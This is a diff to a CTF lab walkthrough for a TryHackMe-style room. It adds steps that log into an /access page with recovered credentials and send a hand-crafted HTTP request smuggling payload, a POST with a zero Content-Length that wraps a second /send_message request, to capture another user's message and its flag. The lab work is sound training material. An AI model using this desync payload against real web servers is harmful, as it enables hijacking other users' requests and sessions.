@@ -292,6 +292,8 @@ Starting gobuster in directory enumeration mode
 /ping                 (Status: 200) [Size: 4]
 ```
 
+![[Pasted image 20250329164258.png]]
+
 
 Port `631`
 ![[Pasted image 20250328182141.png]]
@@ -430,6 +432,39 @@ THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
 
 We have the first flag.
 
+We can try to log on the `/access` page on the port 80 with this redentials `hAckLIEN:YouCanCatchUsInYourDreams404`. And it's work.
+
+![[Pasted image 20250329164413.png]]
+
+When we send a message we have this :
+![[Pasted image 20250329164619.png]]
+
+We change the request to :
+
+```HTTP
+POST / HTTP/2
+Host: elbandito.thm:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-gVOA.Ga1VsgC4Xc6P-rP0ZQGyQVR2iSY
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Content-Length: 0
+
+POST /send_message HTTP/1.1
+Host: elbandito.thm:80
+Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-gVOA.Ga1VsgC4Xc6P-rP0ZQGyQVR2iSY
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 730
+
+data=
+```
+
+Adn we go to `/getMessages`
+
+![[Pasted image 20250329165928.png]]
+
+We have this :
+THM{\u00a1!\u00a1RIGHT_ASCENSION_12h_36m_25.46s!\u00a1!}
+
+Our flag is : `THM{¡!\u00a1RIGHT_ASCENSION_12h_36m_25.46s!\u00a1!}`
 ## 5. **Installation
 
 ## 6. **Command and Control
